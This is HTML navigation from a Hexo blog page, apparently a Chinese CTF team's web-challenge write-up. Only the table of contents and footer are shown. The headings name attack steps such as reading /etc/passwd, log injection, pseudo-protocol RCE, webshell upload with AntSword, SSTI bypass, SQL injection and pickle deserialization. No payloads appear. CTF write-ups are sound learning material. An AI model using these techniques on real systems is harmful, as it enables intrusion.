class="toc-number">17.1.6.</span> <span class="toc-text">我就不信了！</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E8%BF%87%E7%A8%8B%EF%BC%81%EF%BC%81%EF%BC%81%EF%BC%81%EF%BC%81"><span class="toc-number">17.1.7.</span> <span class="toc-text">尝试过程！！！！！</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E7%BB%88payload%EF%BC%9A"><span class="toc-number">17.1.8.</span> <span class="toc-text">最终payload：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Are-you-from-SQNU"><span class="toc-number">18.</span> <span class="toc-text">Are you from SQNU?</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-post%E6%9E%84%E9%80%A0%EF%BC%9A"><span class="toc-number">18.0.1.</span> <span class="toc-text">1.post构造：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Referer%E6%9E%84%E9%80%A0"><span class="toc-number">18.0.2.</span> <span class="toc-text">2.Referer构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-User-Agent%EF%BC%88%E6%B5%8F%E8%A7%88%E5%99%A8%EF%BC%89%E6%9E%84%E9%80%A0"><span class="toc-number">18.0.3.</span> <span class="toc-text">3.User-Agent（浏览器）构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%9C%AC%E5%9C%B0%E4%BC%AA%E9%80%A0"><span class="toc-number">18.0.4.</span> <span class="toc-text">4.本地伪造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-cookie%E4%BC%AA%E9%80%A0"><span class="toc-number">18.0.5.</span> <span class="toc-text">5.cookie伪造</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BC%AA%E8%A3%85%EF%BC%9A"><span class="toc-number">19.</span> <span class="toc-text">伪装：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BB%A3%E7%A0%81%E8%A7%A3%E6%9E%90%EF%BC%9A"><span class="toc-number">19.0.1.</span> <span class="toc-text">1.代码解析：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%93%8E%E5%91%80%E5%A4%A7%E5%A4%A7%E5%A4%A7%E9%BB%91%E5%A1%94"><span class="toc-number">20.</span> <span class="toc-text">哎呀大大大黑塔</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#upload2"><span class="toc-number">21.</span> <span class="toc-text">upload2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E5%A4%B4%E6%96%87%E4%BB%B6%E5%B0%B1%E8%A1%8C%EF%BC%9A"><span class="toc-number">21.0.1.</span> <span class="toc-text">修改头文件就行：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%91%E8%9A%81%E9%93%BE%E6%8E%A5"><span class="toc-number">21.0.2.</span> <span class="toc-text">剑蚁链接</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ggoodd"><span class="toc-number">22.</span> <span class="toc-text">ggoodd</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AE%A1%E7%AE%97%E9%A2%98"><span class="toc-number">23.</span> <span class="toc-text">计算题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E4%B8%80%E4%B8%AA%E8%84%9A%E6%9C%AC%E5%B0%B1%E8%A1%8C%EF%BC%9A"><span class="toc-number">23.0.1.</span> <span class="toc-text">写一个脚本就行：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%BE%E7%89%87%E5%B1%95%E7%A4%BA%E5%8A%9F%E8%83%BD"><span class="toc-number">24.</span> <span class="toc-text">图片展示功能</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E5%AF%9F%E7%82%B9%EF%BC%9A%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%86%B2%E7%AA%81"><span class="toc-number">24.0.1.</span> <span class="toc-text">考察点：配置文件冲突</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E4%B8%80%E4%B8%AAhtaccess%E6%96%87%E4%BB%B6%E5%B0%B1%E8%A1%8C%EF%BC%9A"><span class="toc-number">24.0.2.</span> <span class="toc-text">直接上传一个htaccess文件就行：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E5%9D%91%EF%BC%9A"><span class="toc-number">24.0.3.</span> <span class="toc-text">有坑：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pickle"><span class="toc-number">25.</span> <span class="toc-text">Pickle</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E5%AF%9F%E7%82%B9%EF%BC%9AEZ%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">25.0.1.</span> <span class="toc-text">考察点：EZ反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2%EF%BC%9A"><span class="toc-number">25.0.2.</span> <span class="toc-text">写在前面：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="toc-number">25.0.3.</span> <span class="toc-text">解决方法：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%80%E5%8F%91%E4%BA%BA%E5%91%98%E7%9A%84%E4%B8%8D%E5%B0%8F%E5%BF%83"><span class="toc-number">26.</span> <span class="toc-text">开发人员的不小心</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E5%BE%97%E5%88%B0%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="toc-number">26.1.</span> <span class="toc-text">扫描得到备份文件：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93%E5%BC%80%E5%8F%91%E7%8E%B0flag%EF%BC%9A"><span class="toc-number">26.1.1.</span> <span class="toc-text">打开发现flag：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%87%AA%E7%A7%81%E7%9A%84%E5%B0%8Fs"><span class="toc-number">27.</span> <span class="toc-text">自私的小s</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%BA%E8%BF%98%E4%BB%A5%E4%B8%BA%E6%98%AF%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8%E5%91%A2"><span class="toc-number">27.0.1.</span> <span class="toc-text">俺还以为是字符串逃逸呢</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%93%E5%8C%85%E5%8F%91%E7%8E%B0%E5%9C%A8cookie%E9%87%8C%E9%9D%A2%E6%9C%89%E6%8F%90%E9%86%92%EF%BC%9A"><span class="toc-number">27.0.2.</span> <span class="toc-text">抓包发现在cookie里面有提醒：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE-end-php%E5%BE%97%E5%88%B0%E8%B7%AF%E7%94%B1%EF%BC%9A"><span class="toc-number">27.0.3.</span> <span class="toc-text">访问&#x2F;end.php得到路由：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN"><span class="toc-number">28.</span> <span class="toc-text">PWN</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B5%85%E7%BA%A2%E6%AC%BA%E9%86%89%E7%B2%89%EF%BC%8C%E8%82%AF%E4%BF%A1%E6%9C%89%E6%B1%9F%E6%A2%85"><span class="toc-number">29.</span> <span class="toc-text">浅红欺醉粉，肯信有江梅</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%86%E5%8F%96%E4%BD%A0%E7%9A%84%E5%B0%8F%E7%8C%AB%E5%A8%98"><span class="toc-number">30.</span> <span class="toc-text">领取你的小猫娘</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B1%9F%E5%8D%97%E6%97%A0%E6%89%80%E6%9C%89%EF%BC%8C%E8%81%8A%E8%B5%A0%E4%B8%80%E6%9E%9D%E6%98%A5"><span class="toc-number">31.</span> <span class="toc-text">江南无所有，聊赠一枝春</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%80%9F%E7%9A%84%E4%B8%9C%E9%A3%8E%E7%A0%B4%E9%87%91%E9%94%81"><span class="toc-number">32.</span> <span class="toc-text">借的东风破金锁</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Flight-star" class="lazyload">
+  <div class="sidebar-author-name">Flight-star</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">44</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">11</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Home</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Archives</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">About</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Friend</div>
+    </div>
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  
+</aside>
+
+          
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2025
+      <span class="footer-info-sep"></span>
+      Flight-star
+    </div>
+    
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        40.8k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        03:03
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        <div class="sidebar-top">
+          <img src="/images/taichi.png" height="50" width="50" alt="backtop" />
+          <div class="arrow-up"></div>
+        </div>
+        <div id="mask"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Flitar%E6%88%98%E9%98%9Fwrite-up"><span class="toc-number">1.</span> <span class="toc-text">Flitar战队write-up</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%88%98%E9%98%9F%E4%BF%A1%E6%81%AF%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">战队信息：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8D%E7%A7%B0%EF%BC%9AFlitar"><span class="toc-number">2.0.1.</span> <span class="toc-text">名称：Flitar</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%92%E5%90%8D%EF%BC%9A220"><span class="toc-number">2.0.2.</span> <span class="toc-text">排名：220</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-number">3.</span> <span class="toc-text">WEB</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ezGame"><span class="toc-number">4.</span> <span class="toc-text">ezGame</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#baby-include"><span class="toc-number">5.</span> <span class="toc-text">baby include</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E5%AF%9F%E7%82%B9%EF%BC%9A%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5%EF%BC%8C%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">5.0.1.</span> <span class="toc-text">考察点：日志注入，文件读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E6%98%AF%E6%88%91%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8E%A5%E8%A7%A6%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5%EF%BC%8C%E5%B8%8C%E6%9C%9B%E4%B8%8B%E6%AC%A1%E6%8E%A5%E8%A7%A6%E6%96%B0%E4%BA%8B%E7%89%A9%E4%B9%9F%E8%83%BD%E5%81%9A%E5%87%BA%E6%9D%A5%EF%BC%81"><span class="toc-number">5.0.2.</span> <span class="toc-text">这是我第一次接触日志注入，希望下次接触新事物也能做出来！</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E7%9A%84%E6%AD%A5%E9%AA%A4%EF%BC%9A"><span class="toc-number">5.0.3.</span> <span class="toc-text">我的步骤：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%B5%8B%E8%AF%95%E8%83%BD%E4%B8%8D%E8%83%BD%E8%AF%BB%E5%8F%96-etc-passwd"><span class="toc-number">5.0.3.1.</span> <span class="toc-text">1.测试能不能读取&#x2F;etc&#x2F;passwd</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%B0%9D%E8%AF%95%E9%81%8D%E5%8E%86-%EF%BC%9A"><span class="toc-number">5.0.3.2.</span> <span class="toc-text">2.尝试遍历..&#x2F;：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%B0%9D%E8%AF%95%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%9A"><span class="toc-number">5.0.3.3.</span> <span class="toc-text">3.尝试伪协议：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%B0%9D%E8%AF%95%E7%9B%B4%E6%8E%A5%E8%AF%BB%E5%8F%96filter%EF%BC%9A"><span class="toc-number">5.0.3.3.1.</span> <span class="toc-text">1.尝试直接读取filter：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%B0%9D%E8%AF%95%E8%AF%BB%E5%8F%96flag-php"><span class="toc-number">5.0.3.3.2.</span> <span class="toc-text">2.尝试读取flag.php</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E6%B5%8B%E8%AF%95%E5%85%B6%E4%BB%96%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%8C%E6%B5%8B%E8%AF%95data-input%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%9D%A5RCE"><span class="toc-number">5.0.3.3.3.</span> <span class="toc-text">3.测试其他伪协议，测试data&#x2F;input伪协议来RCE</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E6%9F%B3%E6%9A%97%E8%8A%B1%E6%98%8E%E5%8F%88%E4%B8%80%E6%9D%91%EF%BC%81"><span class="toc-number">5.0.3.3.4.</span> <span class="toc-text">4.柳暗花明又一村！</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5"><span class="toc-number">5.0.3.3.5.</span> <span class="toc-text">5.日志注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6-%E9%80%9A%E8%BF%87%E4%B8%8B%E9%9D%A2%E4%BB%A3%E7%A0%81%E6%9D%A5%E7%9B%91%E5%90%AC%EF%BC%9A"><span class="toc-number">5.0.3.3.6.</span> <span class="toc-text">6.通过下面代码来监听：</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#upload"><span class="toc-number">6.</span> <span class="toc-text">upload</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BE%88%E7%AE%80%E5%8D%95"><span class="toc-number">6.1.</span> <span class="toc-text">很简单</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B%EF%BC%9A"><span class="toc-number">6.1.1.</span> <span class="toc-text">流程：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-BP%E6%8A%93%E5%8C%85%E4%BF%AE%E6%94%B9%E4%B8%BAphp%EF%BC%8C%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E6%88%90%E5%8A%9F%E3%80%82%E3%80%82%E3%80%82%E5%A4%AA%E7%AE%80%E5%8D%95%E4%BA%86%E5%90%A7"><span class="toc-number">6.1.1.1.</span> <span class="toc-text">1.BP抓包修改为php，直接上传成功。。。太简单了吧</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E4%BA%A4%E7%BB%99%E5%89%91%E8%9A%81"><span class="toc-number">6.1.1.2.</span> <span class="toc-text">2.交给剑蚁</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%AE%9E%E5%9C%A8%E6%89%BE%E4%B8%8D%E5%88%B0%E4%BD%8D%E7%BD%AE%EF%BC%8C%E7%9B%B4%E6%8E%A5RCE%E5%A5%BD%E4%BA%86"><span class="toc-number">6.1.1.3.</span> <span class="toc-text">3.实在找不到位置，直接RCE好了</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E6%9F%A5%E8%AF%A2%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">6.1.1.4.</span> <span class="toc-text">4.查询环境变量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E5%8F%AA%E8%83%BD%E6%85%A2%E6%85%A2%E6%89%BE%E4%BA%86%E3%80%82%E3%80%82%E3%80%82%E3%80%82"><span class="toc-number">6.1.1.5.</span> <span class="toc-text">5.只能慢慢找了。。。。</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%95%86%E5%B8%88%E4%B8%80%E6%97%A5%E6%B8%B8"><span class="toc-number">7.</span> <span class="toc-text">商师一日游</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%82%B9%E5%87%BB%E6%BA%90%E7%A0%81%EF%BC%9A"><span class="toc-number">7.0.1.</span> <span class="toc-text">1.点击源码：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8F%91%E9%80%81cookie"><span class="toc-number">7.0.2.</span> <span class="toc-text">2.发送cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%BF%9B%E5%85%A5%E7%BB%88%E7%AB%AF%EF%BC%8C%E5%9C%A8devtool%E4%B8%AD%E6%89%BE%E5%88%B0%E5%A4%8D%E6%B4%BB%E5%B8%81"><span class="toc-number">7.0.3.</span> <span class="toc-text">3.进入终端，在devtool中找到复活币</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%9B%B4%E6%8E%A5%E5%8F%91%E9%80%81-%E6%89%93%E5%BC%80-robots-txt"><span class="toc-number">7.0.4.</span> <span class="toc-text">4.直接发送(打开)robots.txt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%EF%BC%9A"><span class="toc-number">7.0.5.</span> <span class="toc-text">5.正则匹配：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-POST%E6%8F%90%E4%BA%A4"><span class="toc-number">7.0.6.</span> <span class="toc-text">6.POST提交</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%EF%BC%9F"><span class="toc-number">7.0.7.</span> <span class="toc-text">7.执行任意代码？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E6%8B%BC%E6%8E%A5%EF%BC%9A"><span class="toc-number">7.0.8.</span> <span class="toc-text">8.拼接：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#My-blog"><span class="toc-number">8.</span> <span class="toc-text">My blog</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#eeaassyy"><span class="toc-number">9.</span> <span class="toc-text">eeaassyy</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%98%BF%E5%98%BF%E5%98%BF"><span class="toc-number">10.</span> <span class="toc-text">嘿嘿嘿</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E8%BF%99%E4%B9%88%E7%AE%80%E5%8D%95%E3%80%82%E3%80%82%E3%80%82"><span class="toc-number">10.1.</span> <span class="toc-text">怎么这么简单。。。</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#File-download"><span class="toc-number">11.</span> <span class="toc-text">File_download</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80-%E5%B0%9D%E8%AF%95%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">11.0.1.</span> <span class="toc-text">一.尝试文件读取</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E8%BF%9B%E5%85%A5%E9%A1%B5%E9%9D%A2%E5%8F%91%E7%8E%B0%E6%98%AF%E7%99%BB%E5%85%A5%E9%A1%B5%E9%9D%A2%EF%BC%8C%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81%E6%8A%93%E5%8C%85%E5%8F%91%E7%8E%B0%E6%98%AFPOST%E4%BC%A0%E8%BE%93%EF%BC%9A"><span class="toc-number">11.0.1.1.</span> <span class="toc-text">1.进入页面发现是登入页面，输入密码抓包发现是POST传输：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E7%82%B9%E5%BC%80help"><span class="toc-number">11.0.1.2.</span> <span class="toc-text">2.点开help</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E8%AF%BB%E5%8F%96%EF%BC%9A"><span class="toc-number">11.0.1.3.</span> <span class="toc-text">3.读取：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E6%89%BE%E5%88%B0%E5%8E%9F%E5%9E%8B%E9%A2%98%E7%9B%AE%EF%BC%9A-RoarCTF-2019-Easy-Java"><span class="toc-number">11.0.1.4.</span> <span class="toc-text">4.找到原型题目：[RoarCTF 2019]Easy Java</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E8%AF%BB%E5%8F%96%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="toc-number">11.0.1.5.</span> <span class="toc-text">5.读取下载文件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E6%9C%80%E7%BB%88flag%EF%BC%9A"><span class="toc-number">11.0.1.6.</span> <span class="toc-text">6.最终flag：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%94%AF%E4%B8%80%EF%BC%9A"><span class="toc-number">12.</span> <span class="toc-text">唯一：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E5%AF%9F%E7%82%B9%EF%BC%9ASSTIset%E6%9E%84%E9%80%A0%E7%BB%95%E8%BF%87"><span class="toc-number">12.0.1.</span> <span class="toc-text">考察点：SSTIset构造绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%B2%A1%E6%9C%89%E6%8F%90%E9%86%92%EF%BC%8C%E5%8F%AA%E8%83%BD%E7%8C%9C%E6%B5%8B%EF%BC%9A"><span class="toc-number">12.0.2.</span> <span class="toc-text">1.没有提醒，只能猜测：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%81%9A%E9%A2%98%EF%BC%9A"><span class="toc-number">12.0.3.</span> <span class="toc-text">2.做题：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%BB%8F%E8%BF%87%E6%B5%8B%E8%AF%95%EF%BC%8C%E5%8F%91%E7%8E%B0%E8%BF%87%E6%BB%A4"><span class="toc-number">12.0.4.</span> <span class="toc-text">3.经过测试，发现过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%B0%9D%E8%AF%95chr%E7%BB%95%E8%BF%87"><span class="toc-number">12.0.5.</span> <span class="toc-text">4.尝试chr绕过:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%B0%9D%E8%AF%95%E6%9E%84%E9%80%A0%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="toc-number">12.0.6.</span> <span class="toc-text">5.尝试构造绕过：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#baby-rce"><span class="toc-number">13.</span> <span class="toc-text">baby rce</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%EF%BC%9A"><span class="toc-number">13.0.1.</span> <span class="toc-text">源码：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E5%9D%91%E5%95%8A"><span class="toc-number">13.0.2.</span> <span class="toc-text">有坑啊:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%A0%E5%BF%85%E9%A1%BB%E8%BE%93%E5%85%A5%E8%BF%99%E4%B8%AA%E6%95%B0%E5%AD%97"><span class="toc-number">14.</span> <span class="toc-text">你必须输入这个数字:</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE-ME"><span class="toc-number">15.</span> <span class="toc-text">RCE ME</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%97%A0%E8%BF%87%E6%BB%A4"><span class="toc-number">15.0.1.</span> <span class="toc-text">1.无过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%BD%BF%E7%94%A8ls-%E5%8A%A0-nl"><span class="toc-number">15.0.2.</span> <span class="toc-text">2.使用ls   加  nl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E5%85%85%EF%BC%9A"><span class="toc-number">15.0.3.</span> <span class="toc-text">补充：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#cat%E3%80%81nl%E3%80%81od-%E7%9A%84%E6%A0%B8%E5%BF%83%E5%8C%BA%E5%88%AB"><span class="toc-number">15.0.3.1.</span> <span class="toc-text">cat、nl、od 的核心区别</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Ping"><span class="toc-number">16.</span> <span class="toc-text">Ping</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B0%8F%E5%B0%8F%E6%9F%A5%E8%AF%A2%E7%B3%BB%E7%BB%9F"><span class="toc-number">17.</span> <span class="toc-text">小小查询系统:</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%8C%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87%EF%BC%8COFFSET"><span class="toc-number">17.1.</span> <span class="toc-text">sql报错注入，大小写绕过，OFFSET</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A5%BD%E5%83%8F%E3%80%82%E3%80%82%E3%80%82%E6%B2%A1%E4%BB%80%E4%B9%88%E7%94%A8%EF%BC%9F"><span class="toc-number">17.1.1.</span> <span class="toc-text">好像。。。没什么用？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AEai%E6%89%8D%E7%9F%A5%E9%81%93%E5%B0%B1%E8%BF%94%E5%9B%9E%E4%BA%86%E4%B8%80%E5%8D%8A"><span class="toc-number">17.1.2.</span> <span class="toc-text">问ai才知道就返回了一半</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 